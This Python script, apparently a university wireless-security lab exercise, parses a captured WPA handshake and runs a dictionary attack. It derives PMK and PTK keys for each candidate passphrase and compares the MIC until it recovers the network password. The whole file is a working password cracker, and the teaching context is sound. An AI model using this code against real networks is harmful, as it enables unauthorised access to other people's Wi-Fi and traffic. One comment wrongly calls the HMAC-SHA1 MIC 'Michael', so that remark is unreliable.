#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
from scapy.contrib.wpa_eapol import WPA_key

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = "SWI"

APmac = b''
Clientmac = b''


# We checked the association trame in capture, and noticed that the SSID was available, in the "Supported tag". 
# So we could check that we want to attack the targetted SSID.
for trame in wpa:
    if trame.subtype == 0x0 and trame.type == 0x0 and trame.info.decode("ascii") == ssid:
        APmac = a2b_hex(trame.addr1.replace(':', ''))
        Clientmac = a2b_hex(trame.addr2.replace(':', ''))
        break
 
# Authenticator and Supplicant Nonces
ANonce = b''
SNonce = b''
crypto = 0x0

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = b''      
        
for trame in wpa:
    # We get the first signed nonce from the STA to the AP
    if trame.subtype == 0x0 and trame.type == 0x2 \
        and a2b_hex(trame.addr2.replace(':', '')) == APmac \
        and a2b_hex(trame.addr1.replace(':', '')) == Clientmac:

        ANonce = raw(trame)[67:99]
        break
        
SNonceFound = False

for trame in wpa:
    if trame.subtype == 0x8 and trame.type == 0x2 \
        and a2b_hex(trame.addr1.replace(':', '')) == APmac \
        and a2b_hex(trame.addr2.replace(':', '')) == Clientmac:

        # We get the second signed nonce from the AP to the STA
        if not SNonceFound:
            SNonce = raw(trame)[65:97]
            SNonceFound = True
        # We get the mic_to_test
        else:
            mic_to_test = raw(trame)[129:145].hex()
            # http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/Part+II+The+Design+of+Wi-Fi+Security/Chapter+10.+WPA+and+RSN+Key+Hierarchy/Details+of+Key+Derivation+for+WPA/
            crypto = raw(trame)[0x36] & 0x02 # we want to get that bit to know if it's MD5 or SHA1.

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
ssid = str.encode(ssid)
B = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

file1 = open('passphrases.txt', 'r')
Lines = file1.readlines()
for line in Lines:
    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(line.strip())
    if (crypto == 2) :
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
    elif crypto == 1:
        pmk = pbkdf2(hashlib.md5,passPhrase, ssid, 4096, 32)
    else :
        print("unknown error")

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
    if mic_to_test == mic.hexdigest()[:32] :
        print ("Passphrase found !")
        print ("\n\nValues used to derivate keys")
        print ("============================")
        print ("Passphrase: ",passPhrase,"\n")
        print ("SSID: ",ssid,"\n")
        print ("AP Mac: ",b2a_hex(APmac),"\n")
        print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
        print ("AP Nonce: ",b2a_hex(ANonce),"\n")
        print ("Client Nonce: ",b2a_hex(SNonce),"\n")

        print ("\nResults of the key expansion")
        print ("=============================")
        print ("PMK:\t\t",pmk.hex(),"\n")
        print ("PTK:\t\t",ptk.hex(),"\n")
        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
        print ("TK:\t\t",ptk[32:48].hex(),"\n")
        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
        print ("MIC:\t\t",mic.hexdigest(),"\n")
        break # we leave the loop befause we found the correct passphrase